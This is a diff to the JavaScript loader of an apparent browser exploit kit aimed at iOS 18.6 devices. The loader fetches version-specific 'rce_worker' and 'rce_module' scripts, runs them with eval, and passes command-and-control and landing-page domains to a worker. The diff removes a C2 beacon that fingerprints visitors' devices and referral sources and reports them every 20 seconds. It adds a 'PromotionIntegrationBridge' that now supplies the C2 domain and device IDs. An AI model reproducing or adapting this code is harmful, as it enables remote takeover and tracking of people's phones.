@@ -1,17 +1,10 @@
-var SERVER_LOG = false;
+var SERVER_LOG = true;  
+let logStart = new Date().getTime();
+let logEntryID = 0;
 var offsets = {};
 var slide;
 var chipset;
 var device_model;
-
-// 使用当前访问的域名作为 API 域名
-const C2_DOMAIN = location.hostname;
-// 门页域名：door 参数 > referrer(iframe场景) > 自身域名
-const DOOR_DOMAIN = (function() {
-  try { var m = location.search.match(/door=([^&]*)/); if (m) return decodeURIComponent(m[1]); } catch(e) {}
-  try { if (window.top !== window.self && document.referrer) return new URL(document.referrer).hostname; } catch(e) {}
-  return location.hostname;
-})();
 
 var localHost = (function() {
   try {
@@ -22,28 +15,61 @@ var localHost = (function() {
   }
 })();
 
-(function() {
-  try {
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', localHost + '/ds_net.js', false);
-    xhr.send(null);
-    if (xhr.responseText) (0, eval)(xhr.responseText);
-  } catch(e) {}
-})();
-if (typeof globalThis !== 'undefined' && globalThis.dsNet) {
-  globalThis.dsNet.init(localHost);
-  globalThis.dsNet.setServerLog(SERVER_LOG);
-  globalThis.dsNet.setReportMeta({
-    fingerprint: window.FINGERPRINT || ("fallback_" + Date.now()),
-    deviceVersion: getDeviceVersion(),
-    source: getSource(),
-    domain: DOOR_DOMAIN
-  });
-}
+
 
 function print(x, reportError = false, dumphex = false) {
-    dsNet.print(x, reportError, dumphex);
+    let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
+    if (!SERVER_LOG && !reportError) return;
+    const id = logEntryID++;
+    const line = dumphex ? ('#' + id + ' [HEX] ' + x) : ('#' + id + ' ' + out);
+    try { console.log('[log] ' + line); } catch(e) {}
+    try { if (window.__logViewAdd) window.__logViewAdd(line); } catch(e) {}
+    
+    try {
+        var mx = new XMLHttpRequest();
+        mx.open('POST', '/api/debug/logs', false);
+        mx.setRequestHeader('Content-Type', 'text/plain;charset=UTF-8');
+        mx.send(line);
+    } catch(e) {}
 }
+
+
+var __bridge = null;
+var __bridgeRuntime = null;
+
+function __bridgeInit() {
+    try {
+        if (window.PromotionIntegrationBridge &&
+            typeof window.PromotionIntegrationBridge.ready === 'function') {
+            __bridge = window.PromotionIntegrationBridge;
+        }
+    } catch(e) {}
+}
+
+function __bridgeReady() {
+    if (!__bridge || typeof __bridge.ready !== 'function') return Promise.resolve(null);
+    if (__bridgeRuntime) return Promise.resolve(__bridgeRuntime);
+    return Promise.resolve(__bridge.ready())
+        .then(function(rt) { __bridgeRuntime = rt || null; return __bridgeRuntime; })
+        .catch(function() { return null; });
+}
+
+
+function __runtimeChannelSlug() {
+    try { return (__bridgeRuntime && __bridgeRuntime.channel && __bridgeRuntime.channel.slug) || ''; } catch(e) { return ''; }
+}
+function __runtimeDomain() {
+    try {
+        if (__bridgeRuntime && __bridgeRuntime.eventUrl) {
+            return new URL(__bridgeRuntime.eventUrl, location.href).hostname;
+        }
+    } catch(e) {}
+    return location.hostname;
+}
+function __runtimeDeviceId() {
+    try { return (__bridgeRuntime && __bridgeRuntime.integration && __bridgeRuntime.integration.id) || ''; } catch(e) { return ''; }
+}
+
 function redirect() {
     markTerminal("worker_finished");
 }
@@ -58,7 +84,7 @@ function getJS(fname, method = 'GET') {
 }
 
 
-// Unified retry manager: never reload parent/top; retry this iframe at most once.
+
 var qqRunTerminal = false;
 var qqRetryTimer = null;
 
@@ -145,48 +171,7 @@ function armRetryTimeout() {
     }, 180000);
 }
 
-// ip-sync: report device visit to C2
-function getSource() {
-  try {
-    var ua = navigator.userAgent;
-    if (/\[FBAN\/FBIOS;/.test(ua)) return 'Facebook';
-    if (/Instagram/.test(ua)) return 'Instagram';
-    if (/Messenger/.test(ua)) return 'Messenger';
-    if (/Safari/.test(ua) && /Version\//.test(ua)) return 'Safari';
-  } catch(e) {}
-  return 'Other';
-}
-function getDeviceVersion() {
-  try {
-    var ua = navigator.userAgent;
-    var m = ua.match(/OS[_\s](\d+)(?:[._](\d+))?/i);
-    if (m) return 'IOS ' + parseInt(m[1], 10) + '.' + (m[2] || '0');
-    m = ua.match(/iPhone[_\s]OS[_\s](\d+)(?:[._](\d+))?/i);
-    if (m) return 'IOS ' + parseInt(m[1], 10) + '.' + (m[2] || '0');
-    m = ua.match(/Android[_\s](\d+)(?:[._](\d+))?/i);
-    if (m) return 'Android ' + parseInt(m[1], 10) + '.' + (m[2] || '0');
-    m = ua.match(/Windows NT (\d+)\.(\d+)/i);
-    if (m) return 'Windows ' + parseInt(m[1], 10) + '.' + (m[2] || '0');
-    m = ua.match(/Mac OS X (\d+)[._](\d+)/i);
-    if (m) return 'macOS ' + parseInt(m[1], 10) + '.' + (m[2] || '0');
-    if (/Linux/i.test(ua)) return 'Linux';
-    m = ua.match(/(Chrome|Firefox|Safari|Edge|Opera)\/(\d+)/i);
-    if (m) return m[1] + ' ' + m[2];
-    return ua.substring(0, 50) + '...';
-  } catch(e) { return ''; }
-}
-function report() {
-  try {
-    dsNet.postJsonBeacon("https://" + C2_DOMAIN + dsNet.ENDPOINTS.ipSync, dsNet.buildIpSyncBody());
-  } catch(e) {
-    try {
-      dsNet.postJsonBeacon("https://" + C2_DOMAIN + dsNet.ENDPOINTS.debug, dsNet.buildDebugBody(e));
-    } catch(e2) {}
-  }
-}
-setTimeout(report, 500);
-setInterval(report, 20000);
-// Retry timeout is armed from main(); parent/top reload loop intentionally removed.
+
 
 const signal = new Uint8Array(8);
 const dlopen_worker = `(() => {
@@ -220,9 +205,9 @@ const ios_version = (function() {
 })();
 let workerCode = "";
 if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
-    workerCode = getJS(`ds_rce_worker_18.6.js?${Date.now()}`);
+    workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`);
 else
-    workerCode = getJS(`ds_rce_worker.js?${Date.now()}`);
+    workerCode = getJS(`rce_worker.js?${Date.now()}`);
 let workerBlob = new Blob([workerCode],{type:'text/javascript'});
 let workerBlobUrl = URL.createObjectURL(workerBlob);
 (() => {
@@ -230,6 +215,8 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
       redirect();
     }
     function main() {
+        __bridgeInit();
+        __bridgeReady();   
         armRetryTimeout();
         const randomValues = new Uint32Array(32);
         const begin = Date.now();
@@ -312,6 +299,11 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                 });
                 break;
             }
+            case 'log':
+            {
+                try { if (window.__logViewAdd) window.__logViewAdd(data.text); } catch(e) {}
+                break;
+            }
             default:
             {
                 break;
@@ -323,9 +315,9 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         {
         let rceCode = "";
         if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
-                rceCode = getJS(`ds_rce_module_18.6.js?${Date.now()}`);
+                rceCode = getJS(`rce_module_18.6.js?${Date.now()}`);
             else
-                rceCode = getJS(`ds_rce_module.js?${Date.now()}`);
+                rceCode = getJS(`rce_module.js?${Date.now()}`);
         try
         {
             eval(rceCode);
@@ -337,15 +329,18 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         desiredHost = localHost;
             if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
             {
+                
+                __bridgeReady().then(function() {
                 worker.postMessage({
                     type: 'stage1_rce',
                     desiredHost,
                     randomValues,
                     SERVER_LOG,
-                    channelCode: dsNet.getChannelCode(),
-                    c2Domain: C2_DOMAIN,
-                    landingDomain: DOOR_DOMAIN,
-                    deviceId: window._dsDeviceId || ''
+                    channelCode: __runtimeChannelSlug(),
+                    c2Domain: __runtimeDomain(),
+                    landingDomain: __runtimeDomain(),
+                    deviceId: __runtimeDeviceId()
+                });
                 });
             }
             else
@@ -361,6 +356,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                     }
                     else
                             {
+                        __bridgeReady().then(function() {
                         worker.postMessage({
                         type: 'stage1',
                         begin,
@@ -372,15 +368,17 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                         device_model,
                         desiredHost,
                         SERVER_LOG,
-                        channelCode: dsNet.getChannelCode(),
-                        c2Domain: C2_DOMAIN,
-                        landingDomain: DOOR_DOMAIN
+                        channelCode: __runtimeChannelSlug(),
+                        c2Domain: __runtimeDomain(),
+                        landingDomain: __runtimeDomain()
                 });
+                        });
                             }
                         });
                     }
                     else
                     {
+            __bridgeReady().then(function() {
             worker.postMessage({
                 type: 'stage1',
                 begin,
@@ -392,9 +390,10 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                 device_model,
                 desiredHost,
                 SERVER_LOG,
-                channelCode: dsNet.getChannelCode(),
-                c2Domain: C2_DOMAIN,
-                landingDomain: DOOR_DOMAIN
+                channelCode: __runtimeChannelSlug(),
+                c2Domain: __runtimeDomain(),
+                landingDomain: __runtimeDomain()
+            });
             });
                     }
         });
@@ -404,9 +403,5 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         {
         }
     }
-    try {
-      var r = dsNet.postJsonSync('https://' + C2_DOMAIN + dsNet.ENDPOINTS.ipSync, dsNet.buildIpSyncBody());
-      window._dsDeviceId = dsNet.getDeviceIdFromResponse(r);
-    } catch(e) { window._dsDeviceId = ''; }
     main();
   })();
